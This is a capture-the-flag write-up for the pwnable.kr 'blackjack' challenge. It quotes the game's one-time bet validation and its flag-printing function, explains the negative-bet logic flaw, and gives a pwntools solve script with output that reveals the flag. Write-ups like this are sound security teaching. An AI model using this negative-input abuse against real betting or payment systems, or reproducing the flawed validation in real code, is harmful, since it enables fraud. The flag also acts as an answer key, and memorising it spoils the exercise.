# blackjack

## Analysis

(code is in `blackjack.c`)

Almost 800 lines of code 😱, so I had to collapse non-vuln functions in vscode after reading each one.

Observe this simple input validation check:

```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```

Intuition obviously screams while loop when staring at that check.

It only validates `bet` once, so subsequent invalid input works just fine.

Here is flag function:

```c
void cash_test() //Test for if user has cash remaining in purse
{
     if (cash <= 0) //Once user has zero remaining cash, game ends and prompts user to play again
     {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
        FILE* fp=fopen("flag", "r");
        char buf[100];
        memset(buf, 0, 100);
        fread(buf, 1, 100, fp);
        printf("%s\n", buf);
        fclose(fp);
     }
} // End Function
```

Only condition is `cash > 1000000`, initial modal is `500`. Since betting reduces modal (500 - bet), we make our bet a huge negative number to overcome the 1 million cash condition.

## Solution

`nc pwnable.kr 10010` and trying it out manually works fine.

Alternatively,

`solve.py`

```py
from pwn import *

p = remote('pwnable.kr',10010)

p.sendlineafter(b'Are You Ready?', b'Y')
p.sendlineafter(b'Choice:', b'1')
p.sendlineafter(b'Enter Bet:', b'-9999999')
p.sendlineafter(b'Please Enter H to Hit or S to Stay.', b'S')
p.sendlineafter(b'Please Enter Y for Yes or N for No', b'Y')

p.interactive()
```
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10010: Done
[*] Switching to interactive mode

\x1b[2J\x1b[1;1HWoohoo_I_am_now_a_MILL10NAIRE!


Cash: $10000499
-------
|H    |
|  K  |
|    H|
-------

Your Total is 10

The Dealer Has a Total of 6

Enter Bet: $$
```

Flag: `Woohoo_I_am_now_a_MILL10NAIRE!`